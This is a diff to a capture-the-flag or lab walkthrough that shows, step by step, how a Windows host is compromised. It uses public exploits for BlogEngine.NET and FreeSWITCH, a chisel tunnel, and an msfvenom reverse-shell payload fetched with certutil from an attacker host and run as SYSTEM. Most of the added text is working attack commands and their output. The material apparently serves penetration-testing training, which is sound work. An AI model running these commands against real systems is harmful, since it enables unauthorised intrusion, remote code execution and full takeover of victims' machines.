@@ -243,7 +243,24 @@ listening on [any] 4444 ...
 Run the exploit:
 
 ```console
-python3 47010.py -t 10.0.88.33:2390/BlogEngine -u admin -p admin -l kali.vx:4444
+┌──(root㉿kali)-[~]
+└─# searchsploit -m 47010
+  Exploit: BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47010
+     Path: /usr/share/exploitdb/exploits/aspx/webapps/47010.py
+    Codes: N/A
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /root/47010.py
+
+┌──(root㉿kali)-[~]
+└─# sed -i '/proxies = {/,+3d' 47010.py
+
+┌──(root㉿kali)-[~]
+└─# sed -i 's/, proxies=proxies//' 47010.py
+
+┌──(root㉿kali)-[~]
+└─# python3 47010.py -t 10.0.88.33:2390/BlogEngine -u admin -p admin -l kali.vx:4444
 ```
 
 Verify that the reverse shell has hooked on from the listener console:
@@ -289,7 +306,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 SeTimeZonePrivilege           Change the time zone                      Disabled
 ```
 
-Excellent, we now have shell on the target
+Well done, we now have shell on the target
 
 # 4. Privilege escalation
 
@@ -304,6 +321,42 @@ c:\windows\system32\inetsrv>certutil.exe -urlcache -f -split https://raw.githubu
   000000  ...
   01444c
 CertUtil: -URLCache command completed successfully.
+powershell -nop -ep bypass -c "Import-Module %TEMP%\PrivescCheck.ps1; Invoke-PrivescCheck"
+c:\windows\system32\inetsrv>powershell -nop -ep bypass -c "Import-Module %TEMP%\PrivescCheck.ps1; Invoke-PrivescCheck"
+⋮
++------+------------------------------------------------+------+
+| TEST | SERVICES > Non-default Services                | INFO |
++------+------------------------------------------------+------+
+| DESC | List all registered services and filter out the ones  |
+|      | that are built into Windows. It does so by parsing    |
+|      | the target executable's metadata.                     |
++------+-------------------------------------------------------+
+[*] Found 5 result(s).
+Name        : FileZilla Server
+DisplayName : FileZillaServer
+ImagePath   : "C:\xampp\filezillaftp\filezillaserver.exe"
+User        : LocalSystem
+StartMode   : Automatic
+Name        : FreeSWITCH
+DisplayName : FreeSWITCH Multi Protocol Switch
+ImagePath   : "C:\Program Files\FreeSWITCH\FreeSwitchConsole.exe"  -service
+User        : LocalSystem
+StartMode   : Automatic
+Name        : GoogleChromeElevationService
+DisplayName : Google Chrome Elevation Service (GoogleChromeElevationService)
+ImagePath   : "C:\Program Files\Google\Chrome\Application\107.0.5304.122\elevation_service.exe"
+User        : LocalSystem
+StartMode   : Manual
+Name        : gupdate
+DisplayName : Google Update Service (gupdate)
+ImagePath   : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
+User        : LocalSystem
+StartMode   : Automatic
+Name        : gupdatem
+DisplayName : Google Update Service (gupdatem)
+ImagePath   : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /medsvc
+User        : LocalSystem
+StartMode   : Manual
 ⋮
 +------+------------------------------------------------+------+
 | TEST | SERVICES > Binary Permissions                  | VULN |
@@ -334,4 +387,224 @@ Status            : Running
 UserCanStart      : False
 UserCanStop       : False
 ⋮
+```
+
+Privesc points found:
+1. FreeSWITCH
+2. FileZilla
+
+The FileZilla Server is easier to exploit, by just replacing the `filezillaserver.exe` with a reverse shell binary
+
+However, the `iis apppool\defaultapppool` user does not have the permissions to restart the service, this means a machine restart will be required to load the reverse shell - this can be risky as we can lose the current foothold to the machine
+
+## 4.2. Targeting the FreeSWITCH services
+
+Search for exploit:
+
+```console
+┌──(root㉿kali)-[~]
+└─# searchsploit freeswitch
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+FreeSWITCH - Event Socket Command Execution (Metasploit)    | multiple/remote/47698.rb
+FreeSWITCH 1.10.1 - Command Execution                       | windows/remote/47799.txt
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+
+`47799` looks useful, let's try it
+
+```console
+┌──(root㉿kali)-[~]
+└─# searchsploit -m 47799
+  Exploit: FreeSWITCH 1.10.1 - Command Execution
+      URL: https://www.exploit-db.com/exploits/47799
+     Path: /usr/share/exploitdb/exploits/windows/remote/47799.txt
+    Codes: N/A
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /root/47799.txt
+
+
+
+┌──(root㉿kali)-[~]
+└─# mv 47799.txt 47799.py
+
+┌──(root㉿kali)-[~]
+└─# python3 47799.py 10.0.88.33 whoami
+Not prompted for authentication, likely not vulnerable
+```
+
+It appears the target machine rejects connections, as also can be seen form the `Content-Type: text/rude-rejection` returned in nmap scan
+
+☝️ If there is a service running but rejects external connections, it may be configured to allow only local connections
+
+**Important learning point:** Try to find methods to execute the exploit on the machine locally if external connection fails
+
+## 4.3. Targeting the FreeSWITCH services - locally
+
+### Establish port forwarding to the target at the service port on local address
+
+Prepare chisel server on Kali:
+
+```console
+┌──(root㉿kali)-[~]
+└─# curl -LO https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100 3158k  100 3158k    0     0  6676k      0 --:--:-- --:--:-- --:--:-- 6676k
+
+┌──(root㉿kali)-[~]
+└─# gzip -d chisel_1.7.7_linux_amd64.gz
+
+┌──(root㉿kali)-[~]
+└─# mv chisel_1.7.7_linux_amd64 chisel
+
+┌──(root㉿kali)-[~]
+└─# chmod +x chisel
+```
+
+Prepare client binaries for target to download
+
+```console
+┌──(root㉿kali)-[~]
+└─# curl -LO https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100 3175k  100 3175k    0     0  2634k      0  0:00:01  0:00:01 --:--:-- 2634k
+
+┌──(root㉿kali)-[~]
+└─# gzip -d chisel_1.7.7_windows_amd64.gz
+
+┌──(root㉿kali)-[~]
+└─# mv chisel_1.7.7_windows_amd64 /var/www/html/chisel.exe
+```
+
+Download client binaries on target
+
+```cmd
+certutil.exe -urlcache -f -split http://kali.vx/chisel.exe %TEMP%\chisel.exe
+c:\windows\system32\inetsrv>certutil.exe -urlcache -f -split http://kali.vx/chisel.exe %TEMP%\chisel.exe
+****  Online  ****
+  000000  ...
+  7d9800
+CertUtil: -URLCache command completed successfully.
+```
+
+Run the chisel server on Kali
+
+```console
+┌──(root㉿kali)-[~]
+└─# ./chisel server --reverse --port 8080
+2022/12/04 12:18:55 server: Reverse tunnelling enabled
+2022/12/04 12:18:55 server: Fingerprint 2QFdlLDixUwKxkX2ws7p5Bzq9bkzCh/Vk+3Y0DZiJfg=
+2022/12/04 12:18:55 server: Listening on http://0.0.0.0:8080
+```
+
+Run the chisel client on target
+
+```cmd
+%TEMP%\chisel.exe client 192.168.17.10:8080 R:8021:localhost:8021
+c:\windows\system32\inetsrv>%TEMP%\chisel.exe client 192.168.17.10:8080 R:8021:localhost:8021
+```
+
+Verify that the chisel client has hooked on to chisel server
+```console
+2022/12/04 12:19:48 server: session#1: tun: proxy#R:8021=>localhost:8021: Listening
+```
+
+Attempt the exploit again "locally"
+
+```console
+┌──(root㉿kali)-[~]
+└─# python3 47799.py localhost whoami
+Authenticated
+Content-Type: api/response
+Content-Length: 20
+
+nt authority\system
+```
+
+Excellent, we have SYSTEM-level RCE on target
+
+## 4.4. Getting a SYSTEM-level shell
+
+Generate another reverse shell executable and and place in web server root:
+
+(Apache2 is already running with DocumentRoot at /var/www/html)
+
+```console
+┌──(root㉿kali)-[~]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4445 -f exe -o /var/www/html/reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: /var/www/html/reverse.exe
+```
+
+Open another console window on Kali to listen for connections:
+
+```console
+┌──(root㉿kali)-[~]
+└─$ nc -nlvp 4445
+listening on [any] 4445 ...
+```
+
+Download and run the reverse shell executable from the SYSTEM-level RCE
+
+```console
+┌──(root㉿kali)-[~]
+└─# python3 47799.py localhost 'certutil.exe -urlcache -f -split http://kali.vx/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe'
+Authenticated
+```
+
+Verify that the reverse shell has hooked on from the listener console
+
+```cmd
+connect to [192.168.17.10] from (UNKNOWN) [10.0.88.33] 49793
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\FreeSWITCH>whoami
+whoami
+nt authority\system
+```
+
+Excellent, we now have SYSTEM-level shell on the target
+
+# 6. Getting the proof
+
+Now all that's left is to search and retrieve the flag:
+
+```cmd
+C:\Program Files\FreeSWITCH>dir /s C:\*flag.txt*
+dir /s C:\*flag.txt*
+ Volume in drive C has no label.
+ Volume Serial Number is DA18-B95C
+
+ Directory of C:\Users\Mickey\AppData\Roaming\Microsoft\Windows\Recent
+
+11/11/2021  02:18 PM               554 flag.txt.lnk
+               1 File(s)            554 bytes
+
+ Directory of C:\Users\Mickey\Desktop
+
+11/11/2021  02:20 PM               145 flag.txt.txt
+               1 File(s)            145 bytes
+
+     Total Files Listed:
+               2 File(s)            699 bytes
+               0 Dir(s)  40,257,556,480 bytes free
+
+C:\Program Files\FreeSWITCH>type C:\Users\Mickey\Desktop\flag.txt.txt
+type C:\Users\Mickey\Desktop\flag.txt.txt
+CONGRATS ON ROOTING THE BOX
+flag: IFlvdXUgY2FuIGRvIHRoaXMK
+Try the next one from ITSL
+https://www.youtube.com/channel/UCXPdZsu8g1nKerd-o5A75vA
 ```
